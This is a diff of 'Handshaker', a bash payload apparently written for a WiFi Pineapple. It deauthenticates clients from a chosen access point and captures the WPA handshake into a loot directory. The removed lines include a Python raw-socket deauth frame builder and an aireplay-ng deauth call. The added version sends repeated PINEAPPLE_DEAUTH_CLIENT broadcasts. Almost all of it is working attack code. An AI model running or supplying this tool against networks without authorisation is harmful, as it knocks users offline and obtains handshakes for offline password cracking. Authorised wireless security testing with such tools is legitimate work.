@@ -1,42 +1,36 @@
 #!/bin/bash
 # Title: Handshaker
-# Description: Force a handshake for the Recon-selected AP. wlan2mon deauths, wlan1mon listens on the same channel. Press B to stop.
-# Version: 1.1
+# Description: Force a handshake for the Recon-selected AP on wlan1mon. Parks the radio with PINEAPPLE_EXAMINE_CHANNEL <ch> 0 until RESET. Press B to stop.
+# Version: 1.3
 # Category: recon/access_point
 
 HANDSHAKE_DIR="/root/loot/handshakes"
+LISTEN_IFACE="wlan1mon"
 DEAUTH_BURST=12
 LISTEN_WINDOW_SEC=15
 INPUT=/dev/input/event0
 RUN_FLAG="/tmp/handshaker.run"
-DEAUTH_PY="/tmp/handshaker_deauth.py"
 EXAMINE_STARTED=0
-LOCK_PID=""
 TCPDUMP_PID=""
 LISTEN_PCAP=""
 USER_STOP=0
+HANDSHAKE=""
 
 TARGET_SSID="${_RECON_SELECTED_AP_SSID:-}"
 TARGET_BSSID="${_RECON_SELECTED_AP_BSSID:-}"
 TARGET_CHANNEL="${_RECON_SELECTED_AP_CHANNEL:-}"
-TARGET_FREQ="${_RECON_SELECTED_AP_FREQ:-}"
+TARGET_CHANNEL="${TARGET_CHANNEL%% *}"
 
 cleanup() {
     rm -f "$RUN_FLAG"
-    if [ -n "$LOCK_PID" ]; then
-        kill "$LOCK_PID" 2>/dev/null || true
-        wait "$LOCK_PID" 2>/dev/null || true
-        LOCK_PID=""
-    fi
     if [ -n "$TCPDUMP_PID" ]; then
         kill "$TCPDUMP_PID" 2>/dev/null || true
         wait "$TCPDUMP_PID" 2>/dev/null || true
         TCPDUMP_PID=""
     fi
-    rm -f "$DEAUTH_PY"
     if [ "$EXAMINE_STARTED" = "1" ]; then
         LOG blue "Resuming channel hopping.."
-        PINEAPPLE_EXAMINE_RESET >/dev/null 2>&1 || true
+        PINEAPPLE_EXAMINE_RESET
         EXAMINE_STARTED=0
     fi
 }
@@ -56,56 +50,31 @@ clean_bssid() {
     printf "%s" "$1" | tr -d '[:space:]:-' | tr '[:lower:]' '[:upper:]'
 }
 
-lock_monitor_channel() {
-    local iface="$1"
-    [ -z "$iface" ] && return 1
-    ip link set "$iface" up >/dev/null 2>&1 || true
-    iw dev "$iface" set channel "$TARGET_CHANNEL" >/dev/null 2>&1 && return 0
-    iw dev "$iface" set channel "$TARGET_CHANNEL" HT20 >/dev/null 2>&1 && return 0
-    if [ -n "$TARGET_FREQ" ]; then
-        iw dev "$iface" set freq "$TARGET_FREQ" >/dev/null 2>&1 && return 0
-    fi
-    return 1
+flush_buttons() {
+    [ -e "$INPUT" ] || return 0
+    dd if="$INPUT" of=/dev/null bs=16 count=200 iflag=nonblock 2>/dev/null || true
 }
 
-keep_channel_lock() {
-    while [ -f "$RUN_FLAG" ]; do
-        lock_monitor_channel "$LISTEN_IFACE"
-        if [ -n "$DEAUTH_IFACE" ] && [ "$DEAUTH_IFACE" != "$LISTEN_IFACE" ]; then
-            lock_monitor_channel "$DEAUTH_IFACE"
-        fi
-        sleep 1
-    done
-}
-
-button_is_stop() {
-    case "$1" in
-        B|b|A|BACK) return 0 ;;
-    esac
-    return 1
-}
-
-# Non-blocking hardware button (fenris/hati style).
+# Non-blocking hardware button via /dev/input/event0 (SKILL attack-loop / fenris).
 evdev_stop_pressed() {
     local data evtype evvalue
     [ -e "$INPUT" ] || return 1
-    data=$(timeout 0.05 dd if="$INPUT" bs=16 count=1 2>/dev/null | hexdump -e '16/1 "%02x "' 2>/dev/null)
+    data=$(timeout 0.1 dd if="$INPUT" bs=16 count=1 2>/dev/null | hexdump -e '16/1 "%02x "' 2>/dev/null)
     [ -z "$data" ] && return 1
     evtype=$(echo "$data" | cut -d' ' -f9-10)
     evvalue=$(echo "$data" | cut -d' ' -f13)
     [ "$evtype" = "01 00" ] && [ "$evvalue" = "01" ]
 }
 
-# Returns 0 if the user asked to stop, 1 if the second elapsed.
+# Returns 0 if a key-down was seen, 1 if ~1s elapsed with no press.
 wait_one_second() {
-    local btn
-    btn=$(WAIT_FOR_INPUT 1 2>/dev/null || true)
-    if button_is_stop "$btn"; then
-        return 0
-    fi
-    if evdev_stop_pressed; then
-        return 0
-    fi
+    local i=0
+    while [ "$i" -lt 10 ]; do
+        if evdev_stop_pressed; then
+            return 0
+        fi
+        i=$((i + 1))
+    done
     return 1
 }
 
@@ -158,51 +127,10 @@ convert_listen_pcap() {
     return 1
 }
 
-install_deauth_helper() {
-    cat > "$DEAUTH_PY" << 'PY'
-#!/usr/bin/env python3
-import socket
-import sys
-import time
-
-def mac(addr):
-    return bytes(int(part, 16) for part in addr.split(":"))
-
-def build(fc, addr1, addr2, addr3, reason=7):
-    radiotap = bytes([0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00])
-    return radiotap + bytes([fc, 0x00, 0x00, 0x00]) + addr1 + addr2 + addr3 + bytes([0x00, 0x00, reason & 0xFF, 0x00])
-
-iface = sys.argv[1]
-ap = mac(sys.argv[2])
-count = int(sys.argv[3])
-bcast = b"\xff" * 6
-frames = [
-    build(0xC0, bcast, ap, ap),
-    build(0xC0, ap, bcast, ap),
-    build(0xA0, bcast, ap, ap),
-]
-try:
-    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
-    sock.bind((iface, 0))
-    for _ in range(count):
-        for frame in frames:
-            sock.send(frame)
-        time.sleep(0.05)
-except Exception:
-    sys.exit(1)
-PY
-}
-
+# Burst deauth via PineAP inject on wlan1mon, then caller waits so the client can reconnect.
 deauth_target() {
-    lock_monitor_channel "$DEAUTH_IFACE" || true
-    if [ "$DEAUTH_IFACE" != "$LISTEN_IFACE" ] && [ -f "$DEAUTH_PY" ]; then
-        python3 "$DEAUTH_PY" "$DEAUTH_IFACE" "$TARGET_BSSID" "$DEAUTH_BURST" && return 0
-    fi
-    if [ "$DEAUTH_IFACE" != "$LISTEN_IFACE" ] && command -v aireplay-ng >/dev/null 2>&1; then
-        timeout 3 aireplay-ng --deauth "$DEAUTH_BURST" -a "$TARGET_BSSID" "$DEAUTH_IFACE" >/dev/null 2>&1 && return 0
-    fi
+    local i=0
     if type PINEAPPLE_DEAUTH_CLIENT >/dev/null 2>&1; then
-        local i=0
         while [ "$i" -lt "$DEAUTH_BURST" ]; do
             PINEAPPLE_DEAUTH_CLIENT "$TARGET_BSSID" "FF:FF:FF:FF:FF:FF" "$TARGET_CHANNEL"
             i=$((i + 1))
@@ -287,29 +215,26 @@ if ! looks_like_mac "$TARGET_BSSID"; then
     exit 1
 fi
 
+if ! echo "$TARGET_CHANNEL" | grep -Eq '^[0-9]+$'; then
+    ERROR_DIALOG "Invalid Recon channel" "Handshaker needs a numeric channel from Recon."
+    LOG red "Invalid channel: $TARGET_CHANNEL"
+    exit 1
+fi
+
 if [ -z "$TARGET_SSID" ] || [ "$TARGET_SSID" = "(hidden)" ]; then
     TARGET_SSID="(hidden)"
 fi
 
-if ! iface_available "wlan1mon"; then
-    ERROR_DIALOG "wlan1mon missing" "Handshaker listens on wlan1mon. Start PineAP/Recon and retry."
-    LOG red "wlan1mon is not available."
+if ! iface_available "$LISTEN_IFACE"; then
+    ERROR_DIALOG "wlan1mon missing" "Start PineAP/Recon and retry."
+    LOG red "$LISTEN_IFACE is not available."
     exit 1
-fi
-
-LISTEN_IFACE="wlan1mon"
-if iface_available "wlan2mon"; then
-    DEAUTH_IFACE="wlan2mon"
-else
-    DEAUTH_IFACE="wlan1mon"
-    LOG yellow "wlan2mon not found; deauth and listen share wlan1mon."
 fi
 
 LOG blue "Target SSID: $TARGET_SSID"
 LOG blue "Target BSSID: $TARGET_BSSID"
 LOG blue "Target channel: $TARGET_CHANNEL"
-LOG green "Listen: $LISTEN_IFACE"
-LOG green "Deauth: $DEAUTH_IFACE"
+LOG green "Radio: $LISTEN_IFACE (listen + deauth)"
 LOG white "Press B to stop."
 
 HANDSHAKE=$(find_handshake || true)
@@ -319,30 +244,23 @@ if [ -n "$HANDSHAKE" ]; then
     exit 0
 fi
 
-install_deauth_helper
 touch "$RUN_FLAG"
 
-LOG blue "Locking both radios to channel $TARGET_CHANNEL.."
-lock_monitor_channel "$LISTEN_IFACE" || LOG yellow "Could not set $LISTEN_IFACE channel."
-if [ "$DEAUTH_IFACE" != "$LISTEN_IFACE" ]; then
-    lock_monitor_channel "$DEAUTH_IFACE" || LOG yellow "Could not set $DEAUTH_IFACE channel."
-fi
-
-PINEAPPLE_EXAMINE_CHANNEL "$TARGET_CHANNEL" >/dev/null 2>&1 || true
-PINEAPPLE_EXAMINE_BSSID "$TARGET_BSSID"
+LOG blue "Parking $LISTEN_IFACE on channel $TARGET_CHANNEL (EXAMINE 0).."
+PINEAPPLE_EXAMINE_CHANNEL "$TARGET_CHANNEL" 0
 EXAMINE_STARTED=1
-keep_channel_lock &
-LOCK_PID=$!
+sleep 1
 start_listener
-LOG green "Radios locked. wlan1 listens, wlan2 deauths."
+LOG green "wlan1mon parked. Burst deauth, then quiet listen."
 
+flush_buttons
 ATTEMPT=1
 while [ -f "$RUN_FLAG" ]; do
     if evdev_stop_pressed; then
         USER_STOP=1
         break
     fi
-    LOG red "Deauth $ATTEMPT on $TARGET_SSID via $DEAUTH_IFACE"
+    LOG red "Deauth $ATTEMPT on $TARGET_SSID via $LISTEN_IFACE"
     deauth_target
     LOG blue "Quiet listen on $LISTEN_IFACE — press B to stop"
     if wait_listen_window; then
@@ -365,7 +283,7 @@ fi
 if [ -n "$HANDSHAKE" ]; then
     LOG green "Handshake found!"
     LOG green "$HANDSHAKE"
-    ALERT "Handshake captured\n\nSSID: $TARGET_SSID\nBSSID: $TARGET_BSSID\nListen: $LISTEN_IFACE\nDeauth: $DEAUTH_IFACE\nFile: $HANDSHAKE"
+    ALERT "Handshake captured\n\nSSID: $TARGET_SSID\nBSSID: $TARGET_BSSID\nRadio: $LISTEN_IFACE\nFile: $HANDSHAKE"
     exit 0
 fi
 
